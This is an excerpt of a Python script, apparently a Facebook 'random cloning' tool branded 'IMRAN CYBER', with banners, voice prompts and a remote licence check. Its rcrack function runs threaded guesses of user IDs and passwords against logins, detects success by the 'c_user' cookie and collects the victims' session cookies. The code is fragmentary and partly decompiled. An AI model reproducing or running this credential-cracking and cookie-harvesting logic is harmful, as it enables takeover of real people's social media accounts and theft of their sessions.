...
from os import system as _IMRAN_
try:
    import requests
...
def lo(word):
    ...
    for i in range(5):
        for x in range(len(IMRAN)):
            sys.stdout.write(('\r{}{}').format(str(word), IMRAN[x]))
            time.sleep(0.1)
            sys.stdout.flush()
...
def update():
	voice=random.choice([' Tool is on update','try again after update','try again after sometime','tool update is running','IMRAN  CYBER is working'])
	em=random.choice(['🔥','🙄','😒','😐','😡','😈','🥱','😎'])
...
def IMRAN():
    ...
    _IMRAN_("clear")
    print(logo)
    _IMRAN_("espeak \"Hi sir ,Wellcome to EHC IMRAN CYBER KING BANGLADESH  Rendom cloneing tool\"")
    ...
    if None == '2':
        ...
        _IMRAN_("espeak \"Follow my Facebook account\"")
        
        return None
    if None == '3':
        _IMRAN_('xdg-open https://github.com/IMRAN-VI-OFFICIAL')
...
def xxr():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f'\033[38;5;46m│\033[1;91m[\033[1;97m×\033[1;91m]\033[38;5;46m TOOL OWNER   \033[1;97m: \033[38;5;46mIMRAN CYBER      \033[1;97m     │')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m [IMRAN-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m\r')
                _IMRAN_("espeak \"IMRAN  CYBER is brand\"")
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr}IMRAN 𝘽𝙊𝙎𝙎\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
    except:
        pass
def superuser():
    ...
    id = "99".join(uuid)
    print(logo)
    DARK=requests.get("https://raw.githubusercontent.com/IMRAN-VI-OFFICIAL/Fuck/main/Fuck.py").text
    if id in DARK:
        os.system('clear')
        print(logo)
        IMRAN()
